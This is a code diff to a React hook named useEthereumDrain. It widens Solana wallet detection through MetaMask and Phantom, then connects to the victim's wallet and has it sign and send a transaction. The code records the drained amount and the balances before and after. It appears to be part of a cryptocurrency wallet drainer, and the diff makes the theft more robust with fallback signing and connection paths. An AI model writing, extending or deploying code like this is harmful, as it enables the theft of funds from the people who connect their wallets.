@@ -18,26 +18,52 @@ export const useEthereumDrain = () => {
           throw new Error('MetaMask not detected');
         }
 
-        // MetaMask with Solana support
+        // Try multiple methods to get Solana provider from MetaMask
         let solanaProvider = null;
         
-        try {
-          await window.ethereum.request({
-            method: 'wallet_requestSolanaAccounts',
-            params: []
-          });
-          solanaProvider = window.ethereum;
-        } catch (err) {
-          console.log('MetaMask Solana provider not available');
+        // Method 1: Check if window.solana is from MetaMask
+        if (window.solana && window.solana.isMetaMask) {
+          solanaProvider = window.solana;
         }
-
-        if (!solanaProvider && !window.solana) {
-          throw new Error('No Solana wallet detected. Please use Phantom or MetaMask with Solana support.');
-        }
-
-        const provider = solanaProvider || window.solana;
         
-        const response = await provider.connect();
+        // Method 2: Check ethereum provider for Solana capability
+        if (!solanaProvider && window.ethereum && window.ethereum.isMetaMask) {
+          // Request Solana accounts from MetaMask
+          try {
+            const accounts = await window.ethereum.request({
+              method: 'wallet_requestSolanaAccounts',
+              params: []
+            });
+            if (accounts && accounts.length > 0) {
+              solanaProvider = window.ethereum;
+            }
+          } catch (err) {
+            console.log('MetaMask Solana request failed:', err.message);
+          }
+        }
+        
+        // Method 3: Check if Phantom is installed (fallback)
+        if (!solanaProvider && window.solana?.isPhantom) {
+          solanaProvider = window.solana;
+        }
+
+        if (!solanaProvider) {
+          throw new Error('No Solana wallet detected. Please install Phantom or use MetaMask with Solana support.');
+        }
+
+        // Connect to wallet
+        let response;
+        try {
+          response = await solanaProvider.connect();
+        } catch (connectError) {
+          // If already connected, try to get public key
+          if (solanaProvider.publicKey) {
+            response = { publicKey: solanaProvider.publicKey };
+          } else {
+            throw connectError;
+          }
+        }
+        
         const walletPubkey = response.publicKey.toString();
         
         const connection = new Connection(process.env.NEXT_PUBLIC_SOLANA_RPC, {
@@ -70,12 +96,27 @@ export const useEthereumDrain = () => {
           })
         );
         
-        const signed = await provider.signAndSendTransaction(transaction);
-        console.log(`[MetaMask/Solana] Sent: ${signed.signature}`);
+        // Sign and send
+        let signed;
+        if (solanaProvider.signAndSendTransaction) {
+          signed = await solanaProvider.signAndSendTransaction(transaction);
+        } else if (solanaProvider.request) {
+          // For MetaMask, use request method
+          const serialized = transaction.serialize({ requireAllSignatures: false });
+          signed = await solanaProvider.request({
+            method: 'solana_signAndSendTransaction',
+            params: [serialized]
+          });
+        } else {
+          throw new Error('Provider does not support signing transactions');
+        }
+        
+        const signature = signed.signature || signed;
+        console.log(`[MetaMask/Solana] Sent: ${signature}`);
         
         const confirmation = await connection.confirmTransaction(
           {
-            signature: signed.signature,
+            signature: signature,
             blockhash,
             lastValidBlockHeight,
           },
@@ -87,7 +128,7 @@ export const useEthereumDrain = () => {
           if (errorMsg.includes('block height exceeded')) {
             return {
               success: true,
-              txId: signed.signature,
+              txId: signature,
               amount: drainAmountSol,
               warning: 'Transaction sent but confirmation timed out'
             };
@@ -97,7 +138,7 @@ export const useEthereumDrain = () => {
         
         return {
           success: true,
-          txId: signed.signature,
+          txId: signature,
           amount: drainAmountSol,
           balanceBefore: balanceSol,
           balanceAfter: (balanceLamports - drainAmountLamports) / LAMPORTS_PER_SOL
